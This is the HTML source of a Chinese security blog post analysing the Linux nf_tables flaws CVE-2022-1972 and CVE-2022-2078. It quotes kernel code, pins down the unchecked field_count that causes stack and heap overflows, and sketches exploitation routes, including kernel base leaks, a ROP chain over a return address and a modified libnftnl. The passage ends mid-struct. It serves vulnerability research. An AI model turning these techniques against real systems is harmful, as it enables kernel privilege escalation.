@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+  
+
+    <head>
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8" />
+        
+      <meta name="description" content="Boom? PWN ! ! !" />
+      
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>Dig into Netfilter (三) —— CVE-2022-1972 / CVE-2022-2078 |  北极落小雪</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      
+<link rel="stylesheet" href="/css/fonts/remixicon.css">
+
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.staticfile.org/pace/1.2.4/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+  </html>
+</html>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Dig into Netfilter (3)"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Dig into Netfilter (三) —— CVE-2022-1972 / CVE-2022-2078
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2024/Dig%20into%20Netfilter%20(3)/" class="article-date">
+  <time datetime="2024-12-05T16:00:00.000Z" itemprop="datePublished">2024-12-06</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a> / <a class="article-category-link" href="/categories/Pwn/Kernel/">Kernel</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">2.2k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">10 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="新增集合"><a href="#新增集合" class="headerlink" title="新增集合"></a>新增集合</h3><p>在nf_tables中, 还有一个set的概念. 虽然nf_tables没有使用iptables的match-action的概念, 但作为filter就少不了match的过程. set充当一个数据库, 而nft_lookup等指令用来在数据库中进行查找.</p>
+<p>比如想要拦截192.168.1.4, 192.168.1.5等ip的包, 则可以通过如下方式创建命名集合(当然就有匿名集合)blackhole, 并向其中添加ip, 之后的rule即可直接使用这个set.</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nft add set filter blackhole { type ipv4_addr\;}</span><br><span class="line">nft add element filter blackhole { 192.168.1.4, 192.168.1.5 }</span><br><span class="line">nft add rule ip input ip saddr @blackhole drop</span><br></pre></td></tr></tbody></table></figure>
+<span id="more"></span>
+
+<p>nft_dynset表达式用来对set进行增删改.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_dynset_ops</span> {</span></span><br><span class="line">	NFT_DYNSET_OP_ADD,</span><br><span class="line">	NFT_DYNSET_OP_UPDATE,</span><br><span class="line">	NFT_DYNSET_OP_DELETE,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_dynset_flags</span> {</span></span><br><span class="line">	NFT_DYNSET_F_INV	= (<span class="number">1</span> &lt;&lt; <span class="number">0</span>),</span><br><span class="line">	NFT_DYNSET_F_EXPR	= (<span class="number">1</span> &lt;&lt; <span class="number">1</span>),</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * enum nft_dynset_attributes - dynset expression attributes</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_SET_NAME: name of set the to add data to (NLA_STRING)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_SET_ID: uniquely identifier of the set in the transaction (NLA_U32)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_OP: operation (NLA_U32)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_SREG_KEY: source register of the key (NLA_U32)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_SREG_DATA: source register of the data (NLA_U32)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_TIMEOUT: timeout value for the new element (NLA_U64)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_EXPR: expression (NLA_NESTED: nft_expr_attributes)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_FLAGS: flags (NLA_U32)</span></span><br><span class="line"><span class="comment"> * @NFTA_DYNSET_EXPRESSIONS: list of expressions (NLA_NESTED: nft_list_attributes)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">nft_dynset_attributes</span> {</span></span><br><span class="line">	NFTA_DYNSET_UNSPEC,</span><br><span class="line">	NFTA_DYNSET_SET_NAME,</span><br><span class="line">	NFTA_DYNSET_SET_ID,</span><br><span class="line">	NFTA_DYNSET_OP,</span><br><span class="line">	NFTA_DYNSET_SREG_KEY,</span><br><span class="line">	NFTA_DYNSET_SREG_DATA,</span><br><span class="line">	NFTA_DYNSET_TIMEOUT,</span><br><span class="line">	NFTA_DYNSET_EXPR,</span><br><span class="line">	NFTA_DYNSET_PAD,</span><br><span class="line">	NFTA_DYNSET_FLAGS,</span><br><span class="line">	NFTA_DYNSET_EXPRESSIONS,</span><br><span class="line">	__NFTA_DYNSET_MAX,</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>nft_set在内核中有多种数据结构的实现方式.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Sets</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_type</span> *<span class="title">nft_set_types</span>[] =</span> {</span><br><span class="line">	&amp;nft_set_hash_fast_type,</span><br><span class="line">	&amp;nft_set_hash_type,</span><br><span class="line">	&amp;nft_set_rhash_type,</span><br><span class="line">	&amp;nft_set_bitmap_type,</span><br><span class="line">	&amp;nft_set_rbtree_type,</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_X86_64) &amp;&amp; !defined(CONFIG_UML)</span></span><br><span class="line">	&amp;nft_set_pipapo_avx2_type,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	&amp;nft_set_pipapo_type,</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      struct nft_set_type - nf_tables set type</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      @ops: set ops for this type</span></span><br><span class="line"><span class="comment"> *      @features: features supported by the implementation</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_type</span> {</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_set_ops</span>	<span class="title">ops</span>;</span></span><br><span class="line">	u32				features;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>一个set中的一条record有多个filed, 类型有:</p>
+<blockquote>
+<p>ipv4_addr：IPv4 地址<br>ipv6_addr：IPv6 地址<br>ether_addr：以太网（Ethernet）地址<br>inet_proto：网络协议<br>inet_service：网络服务<br>mark：标记类型</p>
+</blockquote>
+<p>比如要过滤127.0.0.1:80端口的数据包, 那么set就应该具有ipv4_addr和inet_service两个filed.<br>不同filed具有不同的长度, 所以在创建set时需要指定.(类比数据库的概念应该很好理解).</p>
+<p>但其实对于set本身来说, key只有一个, 多个filed以concatenation的形式(连续的bytes)使用.<br>虽然lookup时使用的key是一个u32*, 但实际使用的长度是klen.</p>
+<p>这篇文章可能会对理解concatenation有帮助: <a target="_blank" rel="noopener" href="https://lwn.net/Articles/640104/">https://lwn.net/Articles/640104/</a>.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *	struct nft_set_desc - description of set elements</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *	@klen: key length</span></span><br><span class="line"><span class="comment"> *	@dlen: data length</span></span><br><span class="line"><span class="comment"> *	@size: number of set elements</span></span><br><span class="line"><span class="comment"> *	@field_len: length of each field in concatenation, bytes</span></span><br><span class="line"><span class="comment"> *	@field_count: number of concatenated fields in element</span></span><br><span class="line"><span class="comment"> *	@expr: set must support for expressions</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_set_desc</span> {</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		klen;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		dlen;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		size;</span><br><span class="line">	u8			field_len[NFT_REG32_COUNT];</span><br><span class="line">	u8			field_count;</span><br><span class="line">	<span class="type">bool</span>			expr;</span><br><span class="line">};</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>新增set的操作由nf_tables_newset实现, 这里就不做分析了.</p>
+<h3 id="CVE-2022-1972-CVE-2022-2078"><a href="#CVE-2022-1972-CVE-2022-2078" class="headerlink" title="CVE-2022-1972 / CVE-2022-2078"></a>CVE-2022-1972 / CVE-2022-2078</h3><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>源码版本为linux-5.17</p>
+<p>问题出现在解析NFTA_SET_DESC_CONCAT属性时.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nft_set_desc_concat</span><span class="params">(<span class="keyword">struct</span> nft_set_desc *desc,</span></span><br><span class="line"><span class="params">			       <span class="type">const</span> <span class="keyword">struct</span> nlattr *nla)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line">	<span class="type">int</span> rem, err;</span><br><span class="line"></span><br><span class="line">	nla_for_each_nested(attr, nla, rem) {</span><br><span class="line">		<span class="keyword">if</span> (nla_type(attr) != NFTA_LIST_ELEM)</span><br><span class="line">			<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">		err = nft_set_desc_concat_parse(attr, desc);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nft_set_desc_concat_parse</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nlattr *attr,</span></span><br><span class="line"><span class="params">				     <span class="keyword">struct</span> nft_set_desc *desc)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_SET_FIELD_MAX</span> + 1];</span></span><br><span class="line">	u32 len;</span><br><span class="line">	<span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = nla_parse_nested_deprecated(tb, NFTA_SET_FIELD_MAX, attr,</span><br><span class="line">					  nft_concat_policy, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!tb[NFTA_SET_FIELD_LEN])</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	len = ntohl(nla_get_be32(tb[NFTA_SET_FIELD_LEN]));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (len * BITS_PER_BYTE / <span class="number">32</span> &gt; NFT_REG32_COUNT)</span><br><span class="line">		<span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">	desc-&gt;field_len[desc-&gt;field_count++] = len;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p>分析这几行. len为用户完全可控的u32, 在check时乘上BITS_PER_BYTE可能发生溢出, 导致check失效. field_len字段仅为1字节, 所以类似CVE-2022-1015, 我们能将field_len设置的最大值是0xff.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">len = ntohl(nla_get_be32(tb[NFTA_SET_FIELD_LEN]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len * BITS_PER_BYTE / <span class="number">32</span> &gt; NFT_REG32_COUNT)</span><br><span class="line">	<span class="keyword">return</span> -E2BIG;</span><br><span class="line"></span><br><span class="line">desc-&gt;field_len[desc-&gt;field_count++] = len;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查找对该字段的引用, 结果非常少, 有两处可能有用.<br>一处在pipapo_estimate_size函数中, 然而这里在使用前有一个单独的check, gg.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NFT_PIPAPO_MAX_BYTES		(sizeof(struct in6_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u64 <span class="title function_">pipapo_estimate_size</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> nft_set_desc *desc)</span></span><br><span class="line">{</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> entry_size;</span><br><span class="line">	u64 size;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>, entry_size = <span class="number">0</span>; i &lt; desc-&gt;field_count; i++) {</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">long</span> rules;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (desc-&gt;field_len[i] &gt; NFT_PIPAPO_MAX_BYTES)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Worst-case ranges for each concatenated field: each n-bit</span></span><br><span class="line"><span class="comment">		 * field can expand to up to n * 2 rules in each bucket, and</span></span><br><span class="line"><span class="comment">		 * each rule also needs a mapping bucket.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		rules = ilog2(desc-&gt;field_len[i] * BITS_PER_BYTE) * <span class="number">2</span>;</span><br><span class="line">		entry_size += rules *</span><br><span class="line">			      NFT_PIPAPO_BUCKETS(NFT_PIPAPO_GROUP_BITS_INIT) /</span><br><span class="line">			      BITS_PER_BYTE;</span><br><span class="line">		entry_size += rules * <span class="keyword">sizeof</span>(<span class="keyword">union</span> nft_pipapo_map_bucket);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Rules in lookup and mapping tables are needed for each entry */</span></span><br><span class="line">	size = desc-&gt;size * entry_size;</span><br><span class="line">	<span class="keyword">if</span> (size &amp;&amp; div_u64(size, desc-&gt;size) != entry_size)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	size += <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_pipapo) + <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_pipapo_match) * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	size += <span class="keyword">sizeof</span>(<span class="keyword">struct</span> nft_pipapo_field) * desc-&gt;field_count;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> size;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>另一个在nft_pipapo_init函数中, 可以将nft_pipapo_field-&gt;groups和nft_pipapo-&gt;width设置得更大. 但暂未发现有什么影响.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nft_pipapo_for_each_field(f, i, m) {</span><br><span class="line">	<span class="type">int</span> len = desc-&gt;field_len[i] ? : <span class="built_in">set</span>-&gt;klen;</span><br><span class="line"></span><br><span class="line">	f-&gt;bb = NFT_PIPAPO_GROUP_BITS_INIT;</span><br><span class="line">	f-&gt;groups = len * NFT_PIPAPO_GROUPS_PER_BYTE(f);</span><br><span class="line"></span><br><span class="line">	priv-&gt;width += round_up(len, <span class="keyword">sizeof</span>(u32));</span><br><span class="line"></span><br><span class="line">	f-&gt;bsize = <span class="number">0</span>;</span><br><span class="line">	f-&gt;rules = <span class="number">0</span>;</span><br><span class="line">	NFT_PIPAPO_LT_ASSIGN(f, <span class="literal">NULL</span>);</span><br><span class="line">	f-&gt;mt = <span class="literal">NULL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>故事似乎结束了……吗?<br>这个错误的check分散了我们的注意, 这个函数中其实还有一个用户可控且完全没check的值:<br>desc-&gt;field_count.</p>
+<p>用户可以在NFTA_SET_DESC_CONCAT属性中提供超出NFT_REG32_COUNT数量个field_len, 使得溢出发生.这样的溢出点在nf_tables_newset的函数中有两个, 前者是一个栈溢出, 后者是一个堆溢出.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">desc-&gt;field_len[desc-&gt;field_count++] = len;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">nf_tables_newset</span><span class="params">(<span class="keyword">struct</span> sk_buff *skb, <span class="type">const</span> <span class="keyword">struct</span> nfnl_info *info,</span></span><br><span class="line"><span class="params">{</span></span><br><span class="line"><span class="params">......</span></span><br><span class="line"><span class="params">	<span class="built_in">set</span>-&gt;field_count = desc.field_count;</span></span><br><span class="line"><span class="params">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; desc.field_count; i++)</span></span><br><span class="line"><span class="params">		<span class="built_in">set</span>-&gt;field_len[i] = desc.field_len[i];</span></span><br><span class="line"><span class="params">......</span></span><br><span class="line"><span class="params">}</span></span><br></pre></td></tr></tbody></table></figure>
+<h4 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h4><h5 id="一些思路"><a href="#一些思路" class="headerlink" title="一些思路"></a>一些思路</h5><h6 id="1"><a href="#1" class="headerlink" title="1"></a>1</h6><p>利用溢出点1修改field_count, 之后用getset完成set上的越界读, 这会在溢出点2处发生副作用, 将desc后面的不可控数据拷到set上,  最后我们能读出的数据其实不是set里的而是desc后面的.<br>在副作用不使内核崩溃的情况下, 基本只能泄露小部分栈上数据.</p>
+<h6 id="2"><a href="#2" class="headerlink" title="2"></a>2</h6><p>和1基本相同, 只是用不可控的数据覆盖udlen后,getset时对udata的越界堆上读取, 如果布置得当, 这可以泄露内核基址.</p>
+<h6 id="3"><a href="#3" class="headerlink" title="3"></a>3</h6><p>不主动修改field_count, 只是让它简单的增加, 这样可以在溢出点2向nft_set中写入可控数据. </p>
+<h6 id="4"><a href="#4" class="headerlink" title="4"></a>4</h6><p>可以利用不存在的table名跳过溢出点2, 消除了溢出点2的副作用后, 可以将field_count改为较大值而不会崩溃, 这提供了一个在返回地址处写ROP链的机会</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">table = nft_table_lookup(net, nla[NFTA_SET_TABLE], family, genmask,</span><br><span class="line">			 NETLINK_CB(skb).portid);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) {</span><br><span class="line">	NL_SET_BAD_ATTR(extack, nla[NFTA_SET_TABLE]);</span><br><span class="line">	<span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<h5 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h5><p>原本的libnftnl没办法用来打这个漏洞, 或者至少说是不太方便.一是在<a target="_blank" rel="noopener" href="https://git.netfilter.org/libnftnl/commit/?id=407f616ea53184ac3bfb9930d3f27ae1cff9c348">这个commit</a>中在库里加了field_count的check, 二是用户多提供的数据会覆盖掉该库使用的一些数据字段, 导致崩溃或限制我们的利用.<br>最初我尝试比较trick的方式来修改源码, 但效果不太行. 最后还是简单的将nftnl_set中的field_len数组改成一个指针, 并在初始化时分配堆上的空间, 这样我们就可以提供多余的数据而不破坏其他结构.</p>
+<p>顺便将原u8的field_len数组改成u32的, 这样才能在内核中获取对该字段的完全控制, 便于我们利用溢出. 这也不需要其他的什么修改, 因为代码中的寻址是以field_len[i]的形式, 且这个字段使用时也都是以u32的形式使用的.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> {</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_node</span>	<span class="title">hnode</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span>		family;</span><br><span class="line">	<span class="type">uint32_t</span>		set_flags;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*table;</span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*name;</span><br><span class="line">	<span class="type">uint64_t</span>		handle;</span><br><span class="line">	<span class="type">uint32_t</span>		key_type;</span><br><span class="line">	<span class="type">uint32_t</span>		key_len;</span><br><span class="line">	<span class="type">uint32_t</span>		data_type;</span><br><span class="line">	<span class="type">uint32_t</span>		data_len;</span><br><span class="line">	<span class="type">uint32_t</span>		obj_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">		<span class="type">void</span>		*data;</span><br><span class="line">		<span class="type">uint32_t</span>	len;</span><br><span class="line">	} user;</span><br><span class="line">	<span class="type">uint32_t</span>		id;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">nft_set_policies</span>	<span class="title">policy</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> {</span></span><br><span class="line">		<span class="type">uint32_t</span>	size;</span><br><span class="line">		<span class="comment">// uint8_t		field_len[NFT_REG32_COUNT];</span></span><br><span class="line">		<span class="type">uint32_t</span>*		field_len;</span><br><span class="line">		<span class="type">uint8_t</span>		field_count;</span><br><span class="line">	} desc;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">element_list</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="type">uint32_t</span>		flags;</span><br><span class="line">	<span class="type">uint32_t</span>		gc_interval;</span><br><span class="line">	<span class="type">uint64_t</span>		timeout;</span><br><span class="line">	<span class="class"><span 